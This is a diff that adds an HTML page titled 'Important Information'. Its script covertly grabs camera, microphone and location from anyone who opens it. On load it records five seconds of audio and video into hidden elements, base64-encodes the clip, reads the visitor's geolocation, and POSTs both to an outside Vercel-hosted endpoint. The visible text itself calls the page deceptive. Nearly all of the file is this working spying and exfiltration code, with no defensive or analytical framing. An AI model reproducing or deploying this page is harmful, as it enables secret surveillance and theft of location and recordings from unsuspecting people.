@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Important Information</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 80%;
+            max-width: 400px;
+        }
+        h1 {
+            margin-top: 0;
+        }
+        p {
+            margin: 20px 0;
+        }
+        video, canvas, audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Important Information</h1>
+        <p>Please read the following information carefully:</p>
+        <p>This is a deceptive page designed to access your camera, microphone, and location without your knowledge.</p>
+        <p>Thank you for your attention.</p>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <audio id="audio" controls></audio>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const audio = document.getElementById('audio');
+
+        let mediaRecorder;
+        let recordedBlobs;
+
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data && event.data.size > 0) {
+                        recordedBlobs.push(event.data);
+                    }
+                };
+                mediaRecorder.onstop = () => {
+                    const superBuffer = new Blob(recordedBlobs, { type: 'video/webm' });
+                    const videoURL = window.URL.createObjectURL(superBuffer);
+                    audio.src = videoURL;
+
+                    // Convert the Blob to a base64 string
+                    const reader = new FileReader();
+                    reader.readAsDataURL(superBuffer);
+                    reader.onloadend = () => {
+                        const base64data = reader.result.split(',')[1];
+
+                        // Get the user's location
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(position => {
+                                const locationData = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude
+                                };
+
+                                // Send the base64 data and location data to the server
+                                fetch('https://telegram-hcyar7r8c-adhils-projects-51367b9a.vercel.app/', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({ mediaData: base64data, locationData: locationData })
+                                })
+                                .then(response => response.text())
+                                .then(data => {
+                                    console.log('Success:', data);
+                                })
+                                .catch((error) => {
+                                    console.error('Error:', error);
+                                });
+                            }, error => {
+                                console.error('Error getting location:', error);
+                            });
+                        } else {
+                            console.error('Geolocation is not supported by this browser.');
+                        }
+                    };
+                };
+
+                // Start recording immediately
+                recordedBlobs = [];
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000); // Record for 5 seconds
+            })
+            .catch(err => {
+                console.error('Error accessing media devices.', err);
+            });
+    </script>
+</body>
+</html>
